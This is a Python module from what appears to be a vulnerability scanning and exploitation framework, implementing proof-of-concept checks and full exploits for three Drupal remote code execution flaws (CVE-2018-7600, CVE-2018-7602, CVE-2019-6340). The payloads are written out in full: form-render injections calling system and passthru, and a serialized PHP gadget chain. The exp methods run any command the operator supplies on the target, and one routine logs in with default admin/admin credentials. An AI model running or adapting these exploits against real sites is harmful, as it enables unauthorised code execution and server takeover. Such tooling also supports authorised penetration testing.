#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import re
from thirdparty import requests
import threading
from module import globals
from thirdparty.bs4 import BeautifulSoup
from core.verify import verify
from core.verify import misinformation
from module.md5 import random_md5
from thirdparty.requests_toolbelt.utils import dump


class Drupal():
    def __init__(self, url):
        self.url = url
        if self.url[-1] == "/":
            self.url = self.url[:-1]
        self.raw_data = None
        self.vul_info = {}
        self.ua = globals.get_value("UA")  # 获取全局变量UA
        self.timeout = globals.get_value("TIMEOUT")  # 获取全局变量UA
        self.headers = globals.get_value("HEADERS")  # 获取全局变量HEADERS
        self.threadLock = threading.Lock()
        self.payload_cve_2018_7600 = ("form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=system&mail"
                                      "[#type]=markup&mail[#markup]=RECOMMAND")
        self.payload_cve_2019_6340 = "{\r\n\"link\":[\r\n{\r\n\"value\":\"link\",\r\n\"options\":\"O:24:\\\"" \
                                     "GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\"" \
                                     ";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp" \
                                     "\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
                                     "u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\" \
                                     "u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve" \
                                     "\\\";}}\"\r\n}\r\n],\r\n\"_links\":{\r\n\"type\":{\r\n\"href\":\"%s/rest/type/shortcut/default" \
                                     "\"\r\n}\r\n}\r\n}"

    def cve_2018_7600_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Drupal: CVE-2018-7600"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = self.payload_cve_2018_7600.replace("RECOMMAND", "whoami")
        self.vul_info["vul_name"] = "Drupal drupalgeddon2 remote code execution"
        self.vul_info["vul_numb"] = "CVE-2018-7600"
        self.vul_info["vul_apps"] = "Drupal"
        self.vul_info["vul_date"] = "2018-04-13"
        self.vul_info["vul_vers"] = "6.x, 7.x, 8.x"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "编号CVE-2018-7600 Drupal对表单请求内容未做严格过滤，因此，这使得攻击者可能将恶意注入表单内容" \
                                    "，此漏洞允许未经身份验证的攻击者在默认或常见的Drupal安装上执行远程代码执行。"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        md = random_md5()
        cmd = "echo " + md
        self.payload = self.payload_cve_2018_7600.replace("RECOMMAND", cmd)
        self.path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2018_7602_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Drupal: CVE-2018-7602"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "Drupal drupalgeddon2 remote code execution"
        self.vul_info["vul_numb"] = "CVE-2018-7602"
        self.vul_info["vul_apps"] = "Drupal"
        self.vul_info["vul_date"] = "2018-06-19"
        self.vul_info["vul_vers"] = "< 7.59, < 8.5.3"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "这个漏洞是CVE-2018-7600的绕过利用，两个漏洞原理是一样的。" \
                                    "攻击者可以通过不同方式利用该漏洞远程执行代码。" \
                                    "CVE-2018-7602这个漏洞是CVE-2018-7600的另一个利用点，只是入口方式不一样。"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        DRUPAL_U = "admin"
        DRUPAL_P = "admin"
        md = random_md5()
        cmd = "echo " + md
        try:
            self.session = requests.Session()
            self.get_params = {'q': 'user/login'}
            self.post_params = {'form_id': 'user_login', 'name': DRUPAL_U, 'pass': DRUPAL_P, 'op': 'Log in'}
            self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                              timeout=self.timeout, verify=False)
            self.get_params = {'q': 'user'}
            self.r = self.session.get(self.url, params=self.get_params, headers=self.headers, timeout=self.timeout,
                                      verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.user_id = self.soup.find('meta', {'property': 'foaf:name'}).get('about')
            if "?q=" in self.user_id:
                self.user_id = self.user_id.split("=")[1]
            self.get_params = {'q': self.user_id + '/cancel'}
            self.r = self.session.get(self.url, params=self.get_params, headers=self.headers, timeout=self.timeout,
                                      verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
            self.form_token = self.form.find('input', {'name': 'form_token'}).get('value')
            self.get_params = {'q': self.user_id + '/cancel',
                               'destination': self.user_id + '/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + cmd}
            self.post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': self.form_token,
                                '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
            self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                                       timeout=self.timeout, verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
            self.form_build_id = self.form.find('input', {'name': 'form_build_id'}).get('value')
            self.get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + self.form_build_id}
            self.post_params = {'form_build_id': self.form_build_id}
            self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                                       timeout=self.timeout, verify=False)
            if md in misinformation(self.r.text, md):
                self.vul_info["vul_data"] = dump.dump_all(self.r).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_payd"] = '/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + cmd
                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            else:
                self.request = requests.get(self.url + "/CHANGELOG.txt", data=self.payload, headers=self.headers,
                                            timeout=self.timeout, verify=False)
                self.rawdata = dump.dump_all(self.request).decode('utf-8', 'ignore')
                self.allver = re.findall(r"([\d][.][\d]?[.]?[\d])", self.request.text)
                if self.request.status_code == 200 and r"Drupal" in self.request.text:
                    if '7.59' not in self.allver and '8.5.3' not in self.allver:
                        self.vul_info["vul_data"] = dump.dump_all(self.r).decode('utf-8', 'ignore')
                        self.vul_info["prt_resu"] = "PoC_MaYbE"
                        self.vul_info["vul_payd"] = '/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + cmd
                        self.vul_info["prt_info"] = "[maybe] [rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()


    def cve_2019_6340_poc(self):
        self.threadLock.acquire()
        self.vul_info["prt_name"] = "Drupal: CVE-2019-6340"
        self.vul_info["prt_resu"] = "null"
        self.vul_info["prt_info"] = "null"
        self.vul_info["vul_urls"] = self.url
        self.vul_info["vul_payd"] = "null"
        self.vul_info["vul_name"] = "drupal core restful remote code execution"
        self.vul_info["vul_numb"] = "CVE-2019-6340"
        self.vul_info["vul_apps"] = "Drupal"
        self.vul_info["vul_date"] = "2019-02-22"
        self.vul_info["vul_vers"] = "< 8.6.10"
        self.vul_info["vul_risk"] = "high"
        self.vul_info["vul_type"] = "远程代码执行"
        self.vul_info["vul_data"] = "null"
        self.vul_info["vul_desc"] = "POST/PATCH 请求，在进行 REST API 操作的过程中，会将未经安全过滤的参数内容带入unserialize " \
                                    "函数而触发反序列化漏洞，进而导致任意代码执行。"
        self.vul_info["cre_date"] = "2021-01-29"
        self.vul_info["cre_auth"] = "zhzyker"
        self.path = "/node/?_format=hal_json"
        md = random_md5()
        cmd = "echo " + md
        self.cmd_len = len(cmd)
        self.payload = self.payload_cve_2019_6340 % (self.cmd_len, cmd, self.url)
        self.headers = {
            'User-Agent': self.ua,
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            if md in misinformation(request.text, md):
                self.vul_info["vul_data"] = dump.dump_all(request).decode('utf-8', 'ignore')
                self.vul_info["prt_resu"] = "PoCSuCCeSS"
                self.vul_info["vul_urls"] = self.payload
                self.vul_info["prt_info"] = "[rce] [cmd:" + cmd + "]"
            verify.scan_print(self.vul_info)
        except requests.exceptions.Timeout:
            verify.timeout_print(self.vul_info["prt_name"])
        except requests.exceptions.ConnectionError:
            verify.connection_print(self.vul_info["prt_name"])
        except Exception as error:
            verify.error_print(self.vul_info["prt_name"])
        self.threadLock.release()

    def cve_2018_7600_exp(self, cmd):
        vul_name = "Drupal: CVE-2018-7600"
        self.payload = self.payload_cve_2018_7600.replace("RECOMMAND", cmd)
        self.path = "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax"
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers, timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)

    def cve_2018_7602_exp(self, cmd):
        vul_name = "Drupal: CVE-2018-7602"
        DRUPAL_U = "admin"
        DRUPAL_P = "admin"
        try:
            self.session = requests.Session()
            self.get_params = {'q': 'user/login'}
            self.post_params = {'form_id': 'user_login', 'name': DRUPAL_U, 'pass': DRUPAL_P, 'op': 'Log in'}
            self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                              timeout=self.timeout, verify=False)
            self.get_params = {'q': 'user'}
            self.r = self.session.get(self.url, params=self.get_params, headers=self.headers, timeout=self.timeout,
                                      verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.user_id = self.soup.find('meta', {'property': 'foaf:name'}).get('about')
            if "?q=" in self.user_id:
                self.user_id = self.user_id.split("=")[1]
            self.get_params = {'q': self.user_id + '/cancel'}
            self.r = self.session.get(self.url, params=self.get_params, headers=self.headers, timeout=self.timeout,
                                      verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
            self.form_token = self.form.find('input', {'name': 'form_token'}).get('value')
            self.get_params = {'q': self.user_id + '/cancel',
                               'destination': self.user_id + '/cancel?q[%23post_render][]=passthru&q[%23type]=markup&q[%23markup]=' + cmd}
            self.post_params = {'form_id': 'user_cancel_confirm_form', 'form_token': self.form_token,
                                '_triggering_element_name': 'form_id', 'op': 'Cancel account'}
            self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                                       timeout=self.timeout, verify=False)
            self.soup = BeautifulSoup(self.r.text, "html.parser")
            self.form = self.soup.find('form', {'id': 'user-cancel-confirm-form'})
            self.form_build_id = self.form.find('input', {'name': 'form_build_id'}).get('value')
            self.get_params = {'q': 'file/ajax/actions/cancel/#options/path/' + self.form_build_id}
            self.post_params = {'form_build_id': self.form_build_id}
            self.r = self.session.post(self.url, params=self.get_params, data=self.post_params, headers=self.headers,
                                       timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(self.r).decode('utf-8', 'ignore')
            verify.exploit_print(self.r.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)


    def cve_2019_6340_exp(self, cmd):
        vul_name = "Drupal: CVE-2019-6340"
        self.path = "/node/?_format=hal_json"
        self.cmd_len = len(cmd)
        self.payload = self.payload_cve_2019_6340 % (self.cmd_len, cmd, self.url)
        self.headers = {
            'User-Agent': self.ua,
            'Connection': "close",
            'Content-Type': "application/hal+json",
            'Accept': "*/*",
            'Cache-Control': "no-cache"
        }
        try:
            request = requests.post(self.url + self.path, data=self.payload, headers=self.headers,
                                         timeout=self.timeout, verify=False)
            self.raw_data = dump.dump_all(request).decode('utf-8', 'ignore')
            verify.exploit_print(request.text, self.raw_data)
        except requests.exceptions.Timeout:
            verify.timeout_print(vul_name)
        except requests.exceptions.ConnectionError:
            verify.connection_print(vul_name)
        except Exception:
            verify.error_print(vul_name)
